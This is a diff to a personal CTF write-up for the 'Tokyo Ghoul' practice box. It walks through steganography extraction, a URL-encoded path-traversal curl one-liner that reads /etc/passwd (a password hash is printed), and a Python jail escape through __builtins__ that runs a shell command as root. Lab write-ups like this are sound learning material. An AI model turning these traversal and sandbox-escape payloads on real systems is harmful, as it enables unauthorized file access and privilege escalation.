@@ -1,11 +1,20 @@
+[# Tokyo-Ghoul Helped-Through
+
 Name:  Tokyo Ghoul
 Date:  07/05/2022
 Difficulty: Medium
 Description: Help kaneki escape jason room 
-Better Description:  Not a weeb or a man of culture sorry.
+Better Description:  Not a weeb or a man of culture sorry this is just purely profession finishing.
 Goals: 
+- Just finish this weird machine 
+- Learn from [https://github.com/kartikeyj96](https://github.com/kartikeyj96)
 Learnt:
- 
+- How much I have changed
+- Themed boxes has a weird information barrier to entry that is not indicative of the real world networks.
+
+I returned to this machine in 2023 to finish this a learn what I can speeding through these puzzley boxes that made more cryptic by the lore of the anime/manga this box is inspired by. These contextualisations are neat if you know what it is inspired by. I shifted my opinion into making boxes as one everything is self-contained UNLESS you hinted/tolded you need to OSINT something. One of the aspect I found great about the labs is the intel gathering that pieced together the story of a network and its users. I am back for professionalism of finishing and gleaning something from this machine.  
+
+
 ```bash
 root@kali:~# nmap -sC -sV -p- 10.10.72.49
 Starting Nmap 7.80 ( https://nmap.org ) at 2022-04-11 17:16 UTC
@@ -233,11 +242,81 @@ asm.bits 64
 ```
 Switched to Ghidra because I don't have time for reversing at the moment
 ...
+```
 Hey Kaneki finnaly you want to talk 
 Unfortunately before I can give you the kagune you need to give me the paraphrase
 Do you have what I'm looking for?
+
+> kamishiro
 
 Good job. I believe this is what you came for:
 You_found_1t
 ```
 
+jasonroom.html - this was very iterating
+
+I the interest of time 
+```bash
+steghide extract -sf rize_and_kaneki.jpg
+Enter passphrase:
+wrote extracted data to "yougotme.txt".
+```
+
+Cyberchef the morse code -> `from morse -> from hex -> from base64` that is `d1r3c70ry_center` this is a directory to the use `gobuster` to find the `claim`  directory.
+
+The issue with the very disconcerting error messages as hints is that it is filtering bad character "`.`" 
+
+[Octothorpe](https://octothorp88.medium.com/tryhackme-toyko-ghoul-bbf16db3a66a)' sick bash oneliner is awesome - which I want to translate for my GoSmokeSomeFilters   
+```bash
+encoded=$(echo -ne '/../../../../../../../../../../../../' | xxd -plain | tr -d '\n' | sed 's/\(..\)/%\1/g')
+
+curl http://10.10.203.94/d1r3c70ry_center/claim/index.php?view=${encoded}%2fetc%2fpasswd
+```
+
+```
+kamishiro:$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:1001:1001:,,,:/home/kamishiro:/bin/bash
+```
+
+password123 - really. 
+
+The best thing about this room - https://anee.me/escaping-python-jails-849c65cf306e and the bashoneliner
+
+I really wanted to do this challenge, because this more fun than anything that has come before - without reading the link above:
+```python
+#! /usr/bin/python3
+#-*- coding:utf-8 -*-
+def main():
+    print("Hi! Welcome to my world kaneki")
+    print("========================================================================")
+    print("What ? You gonna stand like a chicken ? fight me Kaneki")
+    text = input('>>> ')
+    for keyword in ['eval', 'exec', 'import', 'open', 'os', 'read', 'system', 'write']:
+        if keyword in text:
+            print("Do you think i will let you do this ??????")
+            return;
+    else:
+        exec(text)
+        print('No Kaneki you are so dead')
+if __name__ == "__main__":
+    main()
+```
+
+- We run a python file that has user context of root 
+- not use any of the keywords and run bash
+- [Hacktricks](https://book.hacktricks.xyz/generic-methodologies-and-resources/python/bypass-python-sandboxes)
+
+- Problems
+	- importing alternatives...
+	- Encoding require decoding 
+- `imp.sys.modules["pty"].spawn("/bin/bash")` -  this errored out. as imp is not definedv - you have to import imp....
+- We cant split the keywords and concatenate them together to form a payload in one line as at some point we hit requirement to .exec
+
+```
+impStr1 = "imp"; impStr2 = "ort"; impStr = f"{impStr1}{impStr2}"; impStr
+```
+
+30 minutes of googling and testing Ijust did not get to Builtin section on time.
+```
+__builtins__.__dict__['__IMPORT__'.lower()]('OS'.lower()).__dict__['SYSTEM'.lower()]('cat /root/root.txt') 
+```
+Python allows us to use built in objects using the __builtins__ module. Lets check it out: [https://docs.python.org/3/library/builtins.html](https://docs.python.org/3/library/builtins.html)```
